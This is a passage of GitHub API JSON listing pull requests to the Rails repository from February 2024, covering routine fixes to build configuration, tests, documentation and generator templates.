            "following_url": "https://api.github.com/users/hendrixfan/following{/other_user}",
            "gists_url": "https://api.github.com/users/hendrixfan/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/hendrixfan/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/hendrixfan/subscriptions",
            "organizations_url": "https://api.github.com/users/hendrixfan/orgs",
            "repos_url": "https://api.github.com/users/hendrixfan/repos",
            "events_url": "https://api.github.com/users/hendrixfan/events{/privacy}",
            "received_events_url": "https://api.github.com/users/hendrixfan/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-10T13:10:16Z",
        "updated_at": "2024-02-14T02:40:05Z",
        "closed_at": "2024-02-14T02:40:05Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51040",
            "html_url": "https://github.com/rails/rails/pull/51040",
            "diff_url": "https://github.com/rails/rails/pull/51040.diff",
            "patch_url": "https://github.com/rails/rails/pull/51040.patch",
            "merged_at": "2024-02-14T02:40:05Z"
        },
        "body": "### Motivation / Background\r\n\r\nAs seen in https://buildkite.com/rails/rails/builds/104749#018d92dc-79b9-42bc-9a8c-bbcf5681f9eb/1165-1176 breakOnWarning does not seem to be a valid option for Rollup and causes a Warning `Unknown input options: breakOnWarning.`. \r\n\r\n### Detail\r\n\r\nI cannot find the option in the official [documentation,](https://rollupjs.org/configuration-options/) and therefore I think it can safely be removed\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51040/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51040/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51039",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51039/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51039/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51039/events",
        "html_url": "https://github.com/rails/rails/pull/51039",
        "id": 2128347870,
        "node_id": "PR_kwDNIULOZotwbQ",
        "number": 51039,
        "title": "Update 7.0 release notes re inflections and the once autoloader",
        "user": {
            "login": "fxn",
            "id": 3387,
            "node_id": "MDQ6VXNlcjMzODc=",
            "avatar_url": "https://avatars.githubusercontent.com/u/3387?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fxn",
            "html_url": "https://github.com/fxn",
            "followers_url": "https://api.github.com/users/fxn/followers",
            "following_url": "https://api.github.com/users/fxn/following{/other_user}",
            "gists_url": "https://api.github.com/users/fxn/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fxn/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fxn/subscriptions",
            "organizations_url": "https://api.github.com/users/fxn/orgs",
            "repos_url": "https://api.github.com/users/fxn/repos",
            "events_url": "https://api.github.com/users/fxn/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fxn/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-10T11:47:23Z",
        "updated_at": "2024-02-10T11:51:57Z",
        "closed_at": "2024-02-10T11:51:56Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51039",
            "html_url": "https://github.com/rails/rails/pull/51039",
            "diff_url": "https://github.com/rails/rails/pull/51039.diff",
            "patch_url": "https://github.com/rails/rails/pull/51039.patch",
            "merged_at": "2024-02-10T11:51:56Z"
        },
        "body": "I realized this while chatting with @zenspider about a poltergeist he had upgrading an app.\r\n\r\nThe workaround is suboptimal. In Rails 8 the plan is that new applications will have inflections generated in a different place, and loaded earlier, so users won't need to think about this.\r\n\r\nThis patch will be backported to 7-1-stable and 7-0-stable.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51039/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51039/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51038",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51038/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51038/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51038/events",
        "html_url": "https://github.com/rails/rails/pull/51038",
        "id": 2128321789,
        "node_id": "PR_kwDNIULOZosT3w",
        "number": 51038,
        "title": "Rewrite connection reaper test with timeout",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 9,
        "created_at": "2024-02-10T11:11:44Z",
        "updated_at": "2024-02-17T20:44:15Z",
        "closed_at": "2024-02-17T20:32:04Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51038",
            "html_url": "https://github.com/rails/rails/pull/51038",
            "diff_url": "https://github.com/rails/rails/pull/51038.diff",
            "patch_url": "https://github.com/rails/rails/pull/51038.patch",
            "merged_at": "2024-02-17T20:32:04Z"
        },
        "body": "Trying to debug `reaper_test.rb`.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51038/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51038/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51037",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51037/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51037/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51037/events",
        "html_url": "https://github.com/rails/rails/pull/51037",
        "id": 2128298810,
        "node_id": "PR_kwDNIULOZorGxg",
        "number": 51037,
        "title": "Fix deprecated `enum` syntax in tests",
        "user": {
            "login": "fatkodima",
            "id": 5657035,
            "node_id": "MDQ6VXNlcjU2NTcwMzU=",
            "avatar_url": "https://avatars.githubusercontent.com/u/5657035?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/fatkodima",
            "html_url": "https://github.com/fatkodima",
            "followers_url": "https://api.github.com/users/fatkodima/followers",
            "following_url": "https://api.github.com/users/fatkodima/following{/other_user}",
            "gists_url": "https://api.github.com/users/fatkodima/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/fatkodima/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/fatkodima/subscriptions",
            "organizations_url": "https://api.github.com/users/fatkodima/orgs",
            "repos_url": "https://api.github.com/users/fatkodima/repos",
            "events_url": "https://api.github.com/users/fatkodima/events{/privacy}",
            "received_events_url": "https://api.github.com/users/fatkodima/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-10T10:44:22Z",
        "updated_at": "2024-02-13T12:37:23Z",
        "closed_at": "2024-02-13T12:37:23Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51037",
            "html_url": "https://github.com/rails/rails/pull/51037",
            "diff_url": "https://github.com/rails/rails/pull/51037.diff",
            "patch_url": "https://github.com/rails/rails/pull/51037.patch",
            "merged_at": "2024-02-13T12:37:23Z"
        },
        "body": "Follow up to https://github.com/rails/rails/pull/50987.\r\nhttps://buildkite.com/rails/rails/builds/104740#018d90a5-2b0e-4ef7-a44f-8deb7c9158f5/1175-1181\r\n\r\ncc @skipkayhil ",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51037/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51037/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51036",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51036/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51036/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51036/events",
        "html_url": "https://github.com/rails/rails/pull/51036",
        "id": 2128259504,
        "node_id": "PR_kwDNIULOZoo_lg",
        "number": 51036,
        "title": "Add a basic railtie integration test for Active Storage",
        "user": {
            "login": "zzak",
            "id": 277819,
            "node_id": "MDQ6VXNlcjI3NzgxOQ==",
            "avatar_url": "https://avatars.githubusercontent.com/u/277819?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/zzak",
            "html_url": "https://github.com/zzak",
            "followers_url": "https://api.github.com/users/zzak/followers",
            "following_url": "https://api.github.com/users/zzak/following{/other_user}",
            "gists_url": "https://api.github.com/users/zzak/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/zzak/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/zzak/subscriptions",
            "organizations_url": "https://api.github.com/users/zzak/orgs",
            "repos_url": "https://api.github.com/users/zzak/repos",
            "events_url": "https://api.github.com/users/zzak/events{/privacy}",
            "received_events_url": "https://api.github.com/users/zzak/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "open",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-10T09:34:02Z",
        "updated_at": "2024-02-10T09:34:06Z",
        "closed_at": null,
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51036",
            "html_url": "https://github.com/rails/rails/pull/51036",
            "diff_url": "https://github.com/rails/rails/pull/51036.diff",
            "patch_url": "https://github.com/rails/rails/pull/51036.patch",
            "merged_at": null
        },
        "body": "As part of removing the dummy apps, in #50427, it was suggested to look at ways to improve test coverage from the point of view of Railties.\r\n\r\nThis PR is a first take at that, and always open to feedback/suggestions :bow:",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51036/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51036/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51035",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51035/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51035/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51035/events",
        "html_url": "https://github.com/rails/rails/pull/51035",
        "id": 2127995365,
        "node_id": "PR_kwDNIULOZobcRg",
        "number": 51035,
        "title": "Transform actioncable documentation to Markdown",
        "user": {
            "login": "rafaelfranca",
            "id": 47848,
            "node_id": "MDQ6VXNlcjQ3ODQ4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rafaelfranca",
            "html_url": "https://github.com/rafaelfranca",
            "followers_url": "https://api.github.com/users/rafaelfranca/followers",
            "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
            "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
            "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
            "repos_url": "https://api.github.com/users/rafaelfranca/repos",
            "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 300028327,
                "node_id": "MDU6TGFiZWwzMDAwMjgzMjc=",
                "url": "https://api.github.com/repos/rails/rails/labels/actioncable",
                "name": "actioncable",
                "color": "bfdadc",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-10T00:05:21Z",
        "updated_at": "2024-02-13T22:55:43Z",
        "closed_at": "2024-02-13T22:55:42Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51035",
            "html_url": "https://github.com/rails/rails/pull/51035",
            "diff_url": "https://github.com/rails/rails/pull/51035.diff",
            "patch_url": "https://github.com/rails/rails/pull/51035.patch",
            "merged_at": "2024-02-13T22:55:42Z"
        },
        "body": "Related to https://github.com/rails/rails/issues/50759\r\n\r\n`./tools/rdoc-to-md -a --only=actioncable` to reproduce the results.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51035/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51035/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51034",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51034/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51034/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51034/events",
        "html_url": "https://github.com/rails/rails/pull/51034",
        "id": 2127810259,
        "node_id": "PR_kwDNIULOZoRi5A",
        "number": 51034,
        "title": "Remove initializer that was eager loading the schema cache dump",
        "user": {
            "login": "rafaelfranca",
            "id": 47848,
            "node_id": "MDQ6VXNlcjQ3ODQ4",
            "avatar_url": "https://avatars.githubusercontent.com/u/47848?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/rafaelfranca",
            "html_url": "https://github.com/rafaelfranca",
            "followers_url": "https://api.github.com/users/rafaelfranca/followers",
            "following_url": "https://api.github.com/users/rafaelfranca/following{/other_user}",
            "gists_url": "https://api.github.com/users/rafaelfranca/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/rafaelfranca/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/rafaelfranca/subscriptions",
            "organizations_url": "https://api.github.com/users/rafaelfranca/orgs",
            "repos_url": "https://api.github.com/users/rafaelfranca/repos",
            "events_url": "https://api.github.com/users/rafaelfranca/events{/privacy}",
            "received_events_url": "https://api.github.com/users/rafaelfranca/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107191,
                "node_id": "MDU6TGFiZWwxMDcxOTE=",
                "url": "https://api.github.com/repos/rails/rails/labels/activerecord",
                "name": "activerecord",
                "color": "0b02e1",
                "default": false,
                "description": null
            },
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-09T20:33:24Z",
        "updated_at": "2024-02-15T17:52:51Z",
        "closed_at": "2024-02-14T22:16:53Z",
        "author_association": "MEMBER",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51034",
            "html_url": "https://github.com/rails/rails/pull/51034",
            "diff_url": "https://github.com/rails/rails/pull/51034.diff",
            "patch_url": "https://github.com/rails/rails/pull/51034.patch",
            "merged_at": "2024-02-14T22:16:53Z"
        },
        "body": "This will be eager loaded by the `define_attribute_methods` initializer now that the schema cache can be automatically loaded for all connection if the file is present on disk after https://github.com/rails/rails/pull/48716.",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51034/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51034/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51033",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51033/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51033/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51033/events",
        "html_url": "https://github.com/rails/rails/pull/51033",
        "id": 2127804132,
        "node_id": "PR_kwDNIULOZoRNpw",
        "number": 51033,
        "title": ".gitignore template references git's default instead of custom config",
        "user": {
            "login": "jasonkarns",
            "id": 119972,
            "node_id": "MDQ6VXNlcjExOTk3Mg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/119972?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/jasonkarns",
            "html_url": "https://github.com/jasonkarns",
            "followers_url": "https://api.github.com/users/jasonkarns/followers",
            "following_url": "https://api.github.com/users/jasonkarns/following{/other_user}",
            "gists_url": "https://api.github.com/users/jasonkarns/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/jasonkarns/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/jasonkarns/subscriptions",
            "organizations_url": "https://api.github.com/users/jasonkarns/orgs",
            "repos_url": "https://api.github.com/users/jasonkarns/repos",
            "events_url": "https://api.github.com/users/jasonkarns/events{/privacy}",
            "received_events_url": "https://api.github.com/users/jasonkarns/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 0,
        "created_at": "2024-02-09T20:27:49Z",
        "updated_at": "2024-02-10T21:15:08Z",
        "closed_at": "2024-02-09T22:08:14Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51033",
            "html_url": "https://github.com/rails/rails/pull/51033",
            "diff_url": "https://github.com/rails/rails/pull/51033.diff",
            "patch_url": "https://github.com/rails/rails/pull/51033.patch",
            "merged_at": "2024-02-09T22:08:14Z"
        },
        "body": "### Motivation / Background\r\n\r\nThe current .gitignore file generated by the rails app template encourages customizing git's `core.excludesFile` option. It seems counter to the Rails ethos of leveraging conventions and defaults to actively suggest a bespoke customization.\r\n\r\nThis change now documents the existing default global `excludesFile` location instead.\r\n\r\n### Detail\r\n\r\n`git config core.excludesFile` defaults to `${XDG_CONFIG_HOME:-~/.config}/git/ignore`.\r\n\r\nThis Pull Request changes the .gitignore template in the rails app generator to suggest the default file location instead of configuring a custom location.\r\n\r\n### Additional information\r\n\r\nThis is essentially a docs change as it only updates a code-comment in generator template.\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] ~Tests are added or updated if you fix a bug or add a feature.~ n/a\r\n* [x] ~CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.~ n/a\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51033/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51033/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51032",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51032/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51032/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51032/events",
        "html_url": "https://github.com/rails/rails/pull/51032",
        "id": 2127766257,
        "node_id": "PR_kwDNIULOZoPMFw",
        "number": 51032,
        "title": "Disambiguate language around when controller code stops re: `redirect_to` [ci skip]",
        "user": {
            "login": "DoodlingDev",
            "id": 17572488,
            "node_id": "MDQ6VXNlcjE3NTcyNDg4",
            "avatar_url": "https://avatars.githubusercontent.com/u/17572488?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/DoodlingDev",
            "html_url": "https://github.com/DoodlingDev",
            "followers_url": "https://api.github.com/users/DoodlingDev/followers",
            "following_url": "https://api.github.com/users/DoodlingDev/following{/other_user}",
            "gists_url": "https://api.github.com/users/DoodlingDev/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/DoodlingDev/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/DoodlingDev/subscriptions",
            "organizations_url": "https://api.github.com/users/DoodlingDev/orgs",
            "repos_url": "https://api.github.com/users/DoodlingDev/repos",
            "events_url": "https://api.github.com/users/DoodlingDev/events{/privacy}",
            "received_events_url": "https://api.github.com/users/DoodlingDev/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 150377,
                "node_id": "MDU6TGFiZWwxNTAzNzc=",
                "url": "https://api.github.com/repos/rails/rails/labels/docs",
                "name": "docs",
                "color": "02d7e1",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 2,
        "created_at": "2024-02-09T19:54:53Z",
        "updated_at": "2024-02-09T20:50:21Z",
        "closed_at": "2024-02-09T20:49:57Z",
        "author_association": "CONTRIBUTOR",
        "active_lock_reason": null,
        "draft": false,
        "pull_request": {
            "url": "https://api.github.com/repos/rails/rails/pulls/51032",
            "html_url": "https://github.com/rails/rails/pull/51032",
            "diff_url": "https://github.com/rails/rails/pull/51032.diff",
            "patch_url": "https://github.com/rails/rails/pull/51032.patch",
            "merged_at": "2024-02-09T20:49:57Z"
        },
        "body": "### Motivation / Background / Description\r\n\r\nChanges to: [Layouts and Rendering: 2.3.2 The Difference Between render and redirect_to](https://guides.rubyonrails.org/layouts_and_rendering.html#the-difference-between-render-and-redirect-to)\r\n\r\nThe changed paragraph tends to cause confustion with Rails developers who have just learned the correct control flow of `redirect_to` and `render`.\r\n\r\nA phrase above it in the \"Avoiding Double Render Errors\" section clears up a common misunderstanding that `render` will stop execution within a controller action. That misunderstanding is further clarified with a following phrase.\r\n\r\n> But this will _not_ stop the rest of the code in the `show` action from running\r\n\r\nThis section is often enough to get the point across for newer developers who might often be running into double render errors, but soon after the phrase which attempts the same illustration of `redirect_to`'s execution confuses the matter by using the same language as the earlier statement to mean the opposite.\r\n\r\n> Sometimes inexperienced developers think of `redirect_to` as a sort of `goto` command, moving execution from one place to another in your Rails code. This is _not_ correct. Your code stops running and waits for a new request from the browser.\r\n\r\nHere \"Your code stops running\" means that the action **_will_** run to completion and not jump to another site in controller code, where the other phrase \"stop the rest of the code ... from running\" is used to illustrate the misunderstanding and means the action **_will not_** run to completion. This often re-confuses the concept they've just learned and undermines their understanding. By being more specific in the second phrase, we can reinforce the concept instead.\r\n\r\n### The change\r\n\r\nOpen to feedback around the particular phrasing or formatting, the important part is changing the re-use of the \"stops ... running\" terminology.\r\n\r\n\r\n### Checklist\r\n\r\nBefore submitting the PR make sure the following are checked:\r\n\r\n* [x] This Pull Request is related to one change. Changes that are unrelated should be opened in separate PRs.\r\n* [x] Commit message has a detailed description of what changed and why. If this PR fixes a related issue include it in the commit message. Ex: `[Fix #issue-number]`\r\n* [x] Tests are added or updated if you fix a bug or add a feature.\r\n* [x] CHANGELOG files are updated for the changed libraries if there is a behavior change or additional feature. Minor bug fixes and documentation changes should not be included.\r\n",
        "reactions": {
            "url": "https://api.github.com/repos/rails/rails/issues/51032/reactions",
            "total_count": 0,
            "+1": 0,
            "-1": 0,
            "laugh": 0,
            "hooray": 0,
            "confused": 0,
            "heart": 0,
            "rocket": 0,
            "eyes": 0
        },
        "timeline_url": "https://api.github.com/repos/rails/rails/issues/51032/timeline",
        "performed_via_github_app": null,
        "state_reason": null
    },
    {
        "url": "https://api.github.com/repos/rails/rails/issues/51031",
        "repository_url": "https://api.github.com/repos/rails/rails",
        "labels_url": "https://api.github.com/repos/rails/rails/issues/51031/labels{/name}",
        "comments_url": "https://api.github.com/repos/rails/rails/issues/51031/comments",
        "events_url": "https://api.github.com/repos/rails/rails/issues/51031/events",
        "html_url": "https://github.com/rails/rails/pull/51031",
        "id": 2127662410,
        "node_id": "PR_kwDNIULOZoJpDg",
        "number": 51031,
        "title": "Copy over .ruby-version prior to initial bundle in generated Dockerfile",
        "user": {
            "login": "robzolkos",
            "id": 290616,
            "node_id": "MDQ6VXNlcjI5MDYxNg==",
            "avatar_url": "https://avatars.githubusercontent.com/u/290616?v=4",
            "gravatar_id": "",
            "url": "https://api.github.com/users/robzolkos",
            "html_url": "https://github.com/robzolkos",
            "followers_url": "https://api.github.com/users/robzolkos/followers",
            "following_url": "https://api.github.com/users/robzolkos/following{/other_user}",
            "gists_url": "https://api.github.com/users/robzolkos/gists{/gist_id}",
            "starred_url": "https://api.github.com/users/robzolkos/starred{/owner}{/repo}",
            "subscriptions_url": "https://api.github.com/users/robzolkos/subscriptions",
            "organizations_url": "https://api.github.com/users/robzolkos/orgs",
            "repos_url": "https://api.github.com/users/robzolkos/repos",
            "events_url": "https://api.github.com/users/robzolkos/events{/privacy}",
            "received_events_url": "https://api.github.com/users/robzolkos/received_events",
            "type": "User",
            "site_admin": false
        },
        "labels": [
            {
                "id": 107195,
                "node_id": "MDU6TGFiZWwxMDcxOTU=",
                "url": "https://api.github.com/repos/rails/rails/labels/railties",
                "name": "railties",
                "color": "8BE06E",
                "default": false,
                "description": null
            }
        ],
        "state": "closed",
        "locked": false,
        "assignee": null,
        "assignees": [],
        "milestone": null,
        "comments": 1,
